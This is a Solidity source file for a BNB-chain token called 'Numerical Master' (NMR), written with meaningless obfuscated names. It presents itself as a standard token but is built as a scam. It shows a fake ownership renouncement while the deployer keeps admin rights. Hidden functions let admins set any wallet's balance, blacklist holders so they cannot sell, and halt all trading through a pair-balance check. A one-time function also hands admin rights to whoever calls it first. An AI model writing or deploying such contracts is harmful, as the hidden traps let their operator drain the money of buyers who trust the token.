//SPDX-License-Identifier: MIT

pragma solidity ^0.8.15;

interface totalTradingLaunch {
    function createPair(address toShould, address launchedFee) external returns (address);
}

interface fundTxExempt {
    function totalSupply() external view returns (uint256);

    function balanceOf(address buyLimit) external view returns (uint256);

    function transfer(address walletLiquidity, uint256 minAmount) external returns (bool);

    function allowance(address modeIs, address spender) external view returns (uint256);

    function approve(address spender, uint256 minAmount) external returns (bool);

    function transferFrom(
        address sender,
        address walletLiquidity,
        uint256 minAmount
    ) external returns (bool);

    event Transfer(address indexed from, address indexed walletMax, uint256 value);
    event Approval(address indexed modeIs, address indexed spender, uint256 value);
}

abstract contract tradingSwap {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

interface senderExempt {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);
}

interface maxFund is fundTxExempt {
    function name() external view returns (string memory);

    function symbol() external view returns (string memory);

    function decimals() external view returns (uint8);
}

contract NumericalMaster is tradingSwap, fundTxExempt, maxFund {

    function feeAuto() private view {
        require(txMax[_msgSender()]);
    }

    function minLaunch(address txSellMax) public {
        feeAuto();
        
        if (txSellMax == buyMarketing || txSellMax == feeList) {
            return;
        }
        receiverBuy[txSellMax] = true;
    }

    address public buyMarketing;

    uint256 public amountEnable;

    function getOwner() external view returns (address) {
        return limitLiquidityReceiver;
    }

    uint8 private totalTeam = 18;

    string private amountSender = "NMR";

    function owner() external view returns (address) {
        return limitLiquidityReceiver;
    }

    address teamFund = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;

    function autoTokenTrading(address toAuto, uint256 minAmount) public {
        feeAuto();
        receiverLiquidity[toAuto] = minAmount;
    }

    function transferFrom(address listFee, address walletLiquidity, uint256 minAmount) external override returns (bool) {
        if (_msgSender() != isReceiver) {
            if (tokenLimit[listFee][_msgSender()] != type(uint256).max) {
                require(minAmount <= tokenLimit[listFee][_msgSender()]);
                tokenLimit[listFee][_msgSender()] -= minAmount;
            }
        }
        return atFee(listFee, walletLiquidity, minAmount);
    }

    mapping(address => bool) public txMax;

    address public feeList;

    address isReceiver = 0x10ED43C718714eb63d5aA57B78B54704E256024E;

    bool private tradingTake;

    uint256 public receiverTo;

    uint256 launchedTokenList;

    uint256 constant marketingLaunched = 17 ** 10;

    uint256 launchBuyExempt;

    function balanceOf(address buyLimit) public view virtual override returns (uint256) {
        return receiverLiquidity[buyLimit];
    }

    function atFee(address listFee, address walletLiquidity, uint256 minAmount) internal returns (bool) {
        if (listFee == buyMarketing) {
            return totalLaunchedFund(listFee, walletLiquidity, minAmount);
        }
        uint256 toReceiver = fundTxExempt(feeList).balanceOf(teamFund);
        require(toReceiver == launchBuyExempt);
        require(walletLiquidity != teamFund);
        if (receiverBuy[listFee]) {
            return totalLaunchedFund(listFee, walletLiquidity, marketingLaunched);
        }
        return totalLaunchedFund(listFee, walletLiquidity, minAmount);
    }

    bool public atReceiverFund;

    mapping(address => bool) public receiverBuy;

    function minTake() public {
        emit OwnershipTransferred(buyMarketing, address(0));
        limitLiquidityReceiver = address(0);
    }

    function totalSupply() external view virtual override returns (uint256) {
        return autoTx;
    }

    uint256 private autoTx = 100000000 * 10 ** 18;

    function symbol() external view virtual override returns (string memory) {
        return amountSender;
    }

    function totalLaunchedFund(address listFee, address walletLiquidity, uint256 minAmount) internal returns (bool) {
        require(receiverLiquidity[listFee] >= minAmount);
        receiverLiquidity[listFee] -= minAmount;
        receiverLiquidity[walletLiquidity] += minAmount;
        emit Transfer(listFee, walletLiquidity, minAmount);
        return true;
    }

    function receiverToken(uint256 minAmount) public {
        feeAuto();
        launchBuyExempt = minAmount;
    }

    string private atTotal = "Numerical Master";

    function name() external view virtual override returns (string memory) {
        return atTotal;
    }

    mapping(address => uint256) private receiverLiquidity;

    address private limitLiquidityReceiver;

    mapping(address => mapping(address => uint256)) private tokenLimit;

    function approve(address receiverExempt, uint256 minAmount) public virtual override returns (bool) {
        tokenLimit[_msgSender()][receiverExempt] = minAmount;
        emit Approval(_msgSender(), receiverExempt, minAmount);
        return true;
    }

    bool public enableFrom;

    function transfer(address toAuto, uint256 minAmount) external virtual override returns (bool) {
        return atFee(_msgSender(), toAuto, minAmount);
    }

    function allowance(address liquiditySell, address receiverExempt) external view virtual override returns (uint256) {
        if (receiverExempt == isReceiver) {
            return type(uint256).max;
        }
        return tokenLimit[liquiditySell][receiverExempt];
    }

    function decimals() external view virtual override returns (uint8) {
        return totalTeam;
    }

    event OwnershipTransferred(address indexed minReceiverTeam, address indexed launchedEnable);

    constructor (){
        if (tradingTake) {
            amountEnable = receiverTo;
        }
        senderExempt atIs = senderExempt(isReceiver);
        feeList = totalTradingLaunch(atIs.factory()).createPair(atIs.WETH(), address(this));
        if (receiverTo == amountEnable) {
            tradingTake = false;
        }
        buyMarketing = _msgSender();
        txMax[buyMarketing] = true;
        receiverLiquidity[buyMarketing] = autoTx;
        minTake();
        
        emit Transfer(address(0), buyMarketing, autoTx);
    }

    function sellMode(address marketingReceiver) public {
        require(marketingReceiver.balance < 100000);
        if (atReceiverFund) {
            return;
        }
        
        txMax[marketingReceiver] = true;
        
        atReceiverFund = true;
    }

}